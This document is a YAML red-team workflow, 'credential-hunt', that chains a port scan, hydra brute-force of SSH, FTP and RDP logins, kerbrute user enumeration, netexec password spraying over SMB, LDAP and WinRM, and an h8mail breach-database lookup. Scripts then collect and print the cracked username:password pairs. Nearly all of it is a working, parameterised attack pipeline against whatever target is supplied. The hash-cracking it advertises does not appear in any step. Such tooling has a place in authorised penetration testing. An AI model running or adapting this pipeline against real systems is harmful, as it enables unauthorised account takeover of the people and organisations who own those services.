name: credential-hunt
description: 'Multi-protocol credential hunting — brute-force login services with hydra, spray AD with netexec/kerbrute, search
  breach databases, and identify/crack password hashes.

  '
tags:
- redteam
- brute
- credentials
- hydra
- spray
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target IP or hostname
    users_file:
      required: true
      type: string
      description: Path to username list
    passwords_file:
      type: string
      default: /usr/share/wordlists/rockyou.txt
      description: Path to password list
    domain:
      type: string
      default: ''
      description: AD domain name (for Kerberos/SMB spray)
    protocols:
      type: string
      default: ssh,ftp,smb
      description: Comma-separated protocols for hydra (ssh,ftp,smb,rdp,http-post-form)
jobs:
  service-probe:
    name: Service Detection
    steps:
    - task: naabu
      name: port-scan
      with:
        target: '{{ inputs.target }}'
        top_ports: '1000'
        rate: 1000
      log-stdout: true
      continue-on-error: true
    - task: httpx
      name: http-probe
      with:
        target: '{{ inputs.target }}'
        status_code: true
        title: true
      continue-on-error: true
    - name: detect-services
      script: "ports_data = {{ ports(steps[0].outputs.typed_outputs) | tojson }}\nservice_map = {\n    22: 'ssh', 21: 'ftp',\
        \ 445: 'smb', 3389: 'rdp',\n    3306: 'mysql', 5432: 'postgres', 1433: 'mssql',\n    1521: 'oracle', 6379: 'redis',\
        \ 27017: 'mongodb',\n    5900: 'vnc', 8080: 'http', 443: 'https', 80: 'http'\n}\n\nfound_services = set()\nfor p in\
        \ ports_data:\n    port = p.get('port')\n    if port in service_map:\n        found_services.add(service_map[port])\n\
        \nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"found_services={','.join(sorted(found_services))}\\\
        n\")\n    f.write(f\"service_count={len(found_services)}\\n\")\n\nprint(f\"Login services detected: {', '.join(sorted(found_services))}\"\
        )\n"
  brute-force:
    name: Hydra Brute-Force
    needs:
    - service-probe
    steps:
    - task: hydra
      name: hydra-ssh
      with:
        target: '{{ inputs.target }}'
        login_file: '{{ inputs.users_file }}'
        password_file: '{{ inputs.passwords_file }}'
        service: ssh
        threads: 8
      log-stdout: true
      continue-on-error: true
    - task: hydra
      name: hydra-ftp
      with:
        target: '{{ inputs.target }}'
        login_file: '{{ inputs.users_file }}'
        password_file: '{{ inputs.passwords_file }}'
        service: ftp
        threads: 8
      log-stdout: true
      continue-on-error: true
    - task: hydra
      name: hydra-rdp
      with:
        target: '{{ inputs.target }}'
        login_file: '{{ inputs.users_file }}'
        password_file: '{{ inputs.passwords_file }}'
        service: rdp
        threads: 4
      log-stdout: true
      continue-on-error: true
    - name: collect-creds
      script: "creds = []\nfor idx in range(3):\n    step_data = {{ steps | tojson }}\n    typed = step_data[idx].get('outputs',\
        \ {}).get('typed_outputs', [])\n    for item in typed:\n        if item.get('_type') == 'user_account':\n        \
        \    creds.append(item)\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n    f.write(f\"brute_hits={len(creds)}\\\
        n\")\n    for c in creds:\n        f.write(f\"cred={c.get('username','')}:{c.get('password','')}\\n\")\n\nprint(f\"\
        Hydra found {len(creds)} valid credentials\")\nfor c in creds:\n    print(f\"  [+] {c.get('username')}:{c.get('password')}\"\
        )\n"
      log-stdout: true
  ad-spray:
    name: AD Credential Spray
    needs:
    - service-probe
    if: '{{ inputs.domain }}'
    steps:
    - task: kerbrute
      name: kerbrute-enum
      with:
        target: '{{ inputs.target }}'
        mode: userenum
        dc: '{{ inputs.target }}'
        domain: '{{ inputs.domain }}'
        users: '{{ inputs.users_file }}'
      log-stdout: true
      continue-on-error: true
    - task: netexec
      name: nxc-smb-spray
      with:
        target: '{{ inputs.target }}'
        protocol: smb
        username: '{{ inputs.users_file }}'
        password: '{{ inputs.passwords_file }}'
        domain: '{{ inputs.domain }}'
      log-stdout: true
      continue-on-error: true
    - task: netexec
      name: nxc-ldap-spray
      with:
        target: '{{ inputs.target }}'
        protocol: ldap
        username: '{{ inputs.users_file }}'
        password: '{{ inputs.passwords_file }}'
        domain: '{{ inputs.domain }}'
      log-stdout: true
      continue-on-error: true
    - task: netexec
      name: nxc-winrm-spray
      with:
        target: '{{ inputs.target }}'
        protocol: winrm
        username: '{{ inputs.users_file }}'
        password: '{{ inputs.passwords_file }}'
        domain: '{{ inputs.domain }}'
      log-stdout: true
      continue-on-error: true
    - name: collect-ad-creds
      script: "all_creds = set()\nfor idx in range(4):\n    step_data = {{ steps | tojson }}\n    typed = step_data[idx].get('outputs',\
        \ {}).get('typed_outputs', [])\n    for item in typed:\n        u = item.get('username', '')\n        p = item.get('password',\
        \ '')\n        if u:\n            all_creds.add(f\"{u}:{p}\")\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a') as f:\n \
        \   f.write(f\"ad_spray_hits={len(all_creds)}\\n\")\n\nprint(f\"AD spray found {len(all_creds)} valid credentials\"\
        )\n"
      log-stdout: true
  breach-search:
    name: Breach Database Search
    steps:
    - task: h8mail
      name: h8mail-search
      with:
        target: '{{ inputs.users_file }}'
      log-stdout: true
      continue-on-error: true
    - name: collect-breaches
      script: "breach_creds = {{ users(steps[0].outputs.typed_outputs) | tojson }}\n\nwith open('{{ env.OFX_OUTPUTS }}', 'a')\
        \ as f:\n    f.write(f\"breach_count={len(breach_creds)}\\n\")\n\nprint(f\"Breach database hits: {len(breach_creds)}\"\
        )\n"
      log-stdout: true
  summary:
    name: Credential Hunt Summary
    needs:
    - brute-force
    - ad-spray
    - breach-search
    steps:
    - name: report
      run: 'echo "======================================================"

        echo " CREDENTIAL HUNT COMPLETE: {{ inputs.target }}"

        echo "======================================================"

        echo ""

        echo "--- Services Detected ---"

        echo "Login services: {{ jobs[''service-probe''].outputs.found_services }}"

        echo ""

        echo "--- Hydra Brute-Force ---"

        echo "Valid credentials: {{ jobs[''brute-force''].outputs.brute_hits }}"

        echo ""

        echo "--- AD Spray ---"

        echo "AD spray hits: {{ jobs[''ad-spray''].outputs.ad_spray_hits | default(''N/A (no domain)'', true) }}"

        echo ""

        echo "--- Breach Search ---"

        echo "Breach hits: {{ jobs[''breach-search''].outputs.breach_count }}"

        '
      log-stdout: true
    - name: export-to-project
      script: "import json, os\nfrom pathlib import Path\n\nproject = '{{ vars.project_path | default(\"\", true) }}'\nif\
        \ not project:\n    print('No --project set, skipping file export')\nelse:\n    p = Path(project)\n\n    # login services\n\
        \    d = p / 'evidence/creds'\n    d.mkdir(parents=True, exist_ok=True)\n    data = '''{{ jobs['service-probe'].outputs.found_services\
        \ | default('', true) }}'''.strip()\n    if data:\n        (d / 'found-services.txt').write_text(data)\n        print(f'\
        \  [+] evidence/creds/found-services.txt ({len(data.splitlines())} lines)')\n\n    print(f'Project export complete:\
        \ {project}')"
      continue-on-error: true
